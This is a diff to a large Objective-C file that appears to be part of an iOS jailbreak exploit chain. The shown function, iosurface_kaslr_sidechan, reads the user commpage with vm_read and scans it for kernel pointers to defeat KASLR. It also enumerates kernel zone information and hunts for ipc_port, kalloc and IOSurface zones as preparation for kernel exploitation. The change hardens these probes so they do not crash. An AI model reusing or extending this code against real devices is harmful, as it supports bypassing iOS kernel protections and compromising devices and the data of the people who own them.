@@ -35479,62 +35479,67 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
         NSMutableDictionary *results = [NSMutableDictionary dictionary];
         log(@"JB40: === KASLR Side-Channel + Commpage + Zone Info ===");
 
-        // === Fase 1: Commpage harvest ===
+        // === Fase 1: Commpage harvest via vm_read (safe) ===
         log(@"JB40: === Fase 1: Commpage data harvest ===");
         // arm64 user commpage at 0x0000000FFFFFC000
         uint64_t commpageBase = 0x0000000FFFFFC000ULL;
-        volatile uint8_t *cp = (volatile uint8_t *)commpageBase;
         int cpReadable = 0;
         int cpKptrs = 0;
 
-        // Try reading commpage - signal-safe check
-        @try {
-            // Read first 256 bytes of commpage
-            NSMutableString *cpDump = [NSMutableString string];
-            for (int i = 0; i < 256; i += 8) {
-                uint64_t val = *(volatile uint64_t *)(cp + i);
-                if (i < 128) {
-                    [cpDump appendFormat:@"  cp[%d] = 0x%llx\n", i, val];
-                }
+        // Use vm_read to safely probe commpage — no SIGSEGV risk
+        vm_offset_t cpData = 0;
+        mach_msg_type_number_t cpDataCnt = 0;
+        kern_return_t cpKr = vm_read(mach_task_self(), (vm_address_t)commpageBase, 4096, &cpData, &cpDataCnt);
+        log([NSString stringWithFormat:@"JB40:   vm_read(commpage) kr=%d size=%u", cpKr, cpDataCnt]);
+        results[@"cpVmReadKr"] = @(cpKr);
+
+        if (cpKr == 0 && cpData != 0 && cpDataCnt >= 256) {
+            uint64_t *cpWords = (uint64_t *)cpData;
+            int qwordCount = cpDataCnt / 8;
+
+            for (int i = 0; i < qwordCount && i < 32; i++) {
+                uint64_t val = cpWords[i];
                 if (val != 0) cpReadable++;
-                // Check for kernel pointers (0xFFFFFFF0xxxxxxxx range)
                 if ((val >> 32) >= 0xFFFFFFF0 && (val >> 32) <= 0xFFFFFFFF) {
                     cpKptrs++;
-                    log([NSString stringWithFormat:@"JB40:   [!!!] KPTR at cp+%d = 0x%llx", i, val]);
-                    results[[NSString stringWithFormat:@"cpKptr_%d", i]] = @(val);
+                    log([NSString stringWithFormat:@"JB40:   [!!!] KPTR at cp+%d = 0x%llx", i*8, val]);
+                    results[[NSString stringWithFormat:@"cpKptr_%d", i*8]] = @(val);
+                }
+                if (i < 16) {
+                    log([NSString stringWithFormat:@"JB40:   cp[0x%x] = 0x%llx", i*8, val]);
                 }
             }
-            log([NSString stringWithFormat:@"JB40:   Commpage readable: %d non-zero qwords in 256 bytes", cpReadable]);
-            log([NSString stringWithFormat:@"JB40:   Kernel pointers found: %d", cpKptrs]);
+            log([NSString stringWithFormat:@"JB40:   Commpage: %d non-zero qwords in first 256 bytes", cpReadable]);
 
-            // Known commpage offsets for interesting data
-            // CPU capabilities at offset 0x20
-            uint64_t cpuCaps = *(volatile uint64_t *)(cp + 0x20);
-            log([NSString stringWithFormat:@"JB40:   CPU caps = 0x%llx", cpuCaps]);
-            results[@"cpuCaps"] = @(cpuCaps);
+            // CPU caps at offset 0x20, timebase at 0x50
+            if (cpDataCnt >= 0x58) {
+                uint64_t cpuCaps = cpWords[0x20/8];
+                log([NSString stringWithFormat:@"JB40:   CPU caps = 0x%llx", cpuCaps]);
+                results[@"cpuCaps"] = @(cpuCaps);
+                uint32_t *cp32 = (uint32_t *)cpData;
+                uint32_t tbNum = cp32[0x50/4];
+                uint32_t tbDen = cp32[0x54/4];
+                log([NSString stringWithFormat:@"JB40:   Timebase num/den = %u/%u", tbNum, tbDen]);
+            }
 
-            // Timebase info at offset 0x50-0x58
-            uint32_t tbNum = *(volatile uint32_t *)(cp + 0x50);
-            uint32_t tbDen = *(volatile uint32_t *)(cp + 0x54);
-            log([NSString stringWithFormat:@"JB40:   Timebase num/den = %u/%u", tbNum, tbDen]);
-
-            // Scan more of commpage (up to 4KB)
+            // Scan full 4KB for kernel pointers
             int totalKptrs = 0;
-            for (int i = 0; i < 4096; i += 8) {
-                uint64_t val = *(volatile uint64_t *)(cp + i);
+            for (int i = 0; i < qwordCount; i++) {
+                uint64_t val = cpWords[i];
                 if ((val >> 32) >= 0xFFFFFFF0 && (val >> 32) <= 0xFFFFFFFF) {
                     totalKptrs++;
                     if (totalKptrs <= 10) {
-                        log([NSString stringWithFormat:@"JB40:   KPTR cp+0x%x = 0x%llx", i, val]);
-                        results[[NSString stringWithFormat:@"cpKptr_0x%x", i]] = @(val);
+                        log([NSString stringWithFormat:@"JB40:   KPTR cp+0x%x = 0x%llx", i*8, val]);
+                        results[[NSString stringWithFormat:@"cpKptr_0x%x", i*8]] = @(val);
                     }
                 }
             }
             log([NSString stringWithFormat:@"JB40:   Total kptrs in 4KB commpage: %d", totalKptrs]);
             results[@"cpTotalKptrs"] = @(totalKptrs);
             results[@"cpReadable"] = @(cpReadable);
-        } @catch (NSException *ex) {
-            log([NSString stringWithFormat:@"JB40:   Commpage NOT readable: %@", ex]);
+            vm_deallocate(mach_task_self(), cpData, cpDataCnt);
+        } else {
+            log(@"JB40:   Commpage NOT readable via vm_read");
             results[@"cpReadable"] = @(-1);
         }
 
@@ -35555,11 +35560,9 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
             results[@"hziKr"] = @(kr);
             results[@"hziNamesCnt"] = @(namesCnt);
 
-            if (kr == 0 && namesCnt > 0 && names != 0) {
-                // zone_name is 80 bytes each
+            if (kr == 0 && namesCnt > 0 && names != 0 && info != 0) {
                 typedef struct { char name[80]; } zone_name_t;
                 zone_name_t *zn = (zone_name_t *)names;
-                // zone_info is 64 bytes each (varies)
                 typedef struct {
                     uint64_t zi_count;
                     uint64_t zi_cur_size;
@@ -35572,23 +35575,21 @@ void iosurface_kaslr_sidechan(ISRLogBlock log, ISRDoneBlock done) {
                 } zone_info_t;
                 zone_info_t *zi = (zone_info_t *)info;
 
-                int zoneCount = namesCnt;
-                log([NSString stringWithFormat:@"JB40:   Found %d kernel zones!", zoneCount]);
+                int zoneCount = (int)namesCnt;
+                int infoMax = (int)((infoCnt * sizeof(int)) / sizeof(zone_info_t));
+                int safeCount = zoneCount < infoMax ? zoneCount : infoMax;
+                log([NSString stringWithFormat:@"JB40:   Found %d kernel zones (safe=%d)!", zoneCount, safeCount]);
                 results[@"zoneCount"] = @(zoneCount);
 
-                // Print first 20 zones and any with interesting names
-                for (int i = 0; i < zoneCount && i < (int)(infoCnt * sizeof(int) / sizeof(zone_info_t)); i++) {
+                for (int i = 0; i < safeCount; i++) {
+                    zn[i].name[79] = '\0';
                     NSString *zname = [NSString stringWithUTF8String:zn[i].name];
+                    if (!zname) zname = @"<null>";
                     if (i < 20 || [zname containsString:@"ipc"] || [zname containsString:@"kalloc"] ||
                         [zname containsString:@"IOSurface"] || [zname containsString:@"port"]) {
                         log([NSString stringWithFormat:@"JB40:   zone[%d] '%@' cnt=%llu cur=%llu elem=%llu",
                              i, zname, zi[i].zi_count, zi[i].zi_cur_size, zi[i].zi_elem_size]);
                     }
-                }
-
-                // Look for ipc_port zone specifically
-                for (int i = 0; i < zoneCount; i++) {
-                    NSString *zname = [NSString stringWithUTF8String:zn[i].name];
                     if ([zname containsString:@"ipc_port"] || [zname containsString:@"ipc.port"]) {
                         log([NSString stringWithFormat:@"JB40:   [!!!] ipc_port zone: cnt=%llu cur=%llu elem=%llu max=%llu",
                              zi[i].zi_count, zi[i].zi_cur_size, zi[i].zi_elem_size, zi[i].zi_max_size]);
